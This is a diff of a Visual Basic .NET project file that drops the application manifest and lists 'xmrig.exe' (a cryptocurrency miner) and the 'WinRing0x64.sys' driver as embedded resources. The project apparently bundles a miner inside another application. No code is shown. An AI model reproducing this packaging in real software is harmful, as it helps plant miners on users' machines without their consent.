@@ -90,9 +90,7 @@
     <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
     <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
-  <PropertyGroup>
-    <ApplicationManifest>My Project\app.manifest</ApplicationManifest>
-  </PropertyGroup>
+  <PropertyGroup />
   <ItemGroup>
     <Reference Include="Microsoft.VisualBasic.Compatibility" />
     <Reference Include="System" />
@@ -188,10 +186,11 @@
     </BootstrapperPackage>
   </ItemGroup>
   <ItemGroup>
-    <None Include="Resources\Project1.dll" />
+    <None Include="Resources\WinRing0x64.sys" />
+    <None Include="Resources\xmrig.exe" />
   </ItemGroup>
   <ItemGroup>
-    <None Include="Resources\xmrig.exe" />
+    <None Include="Resources\Project1.dll" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
 </Project>
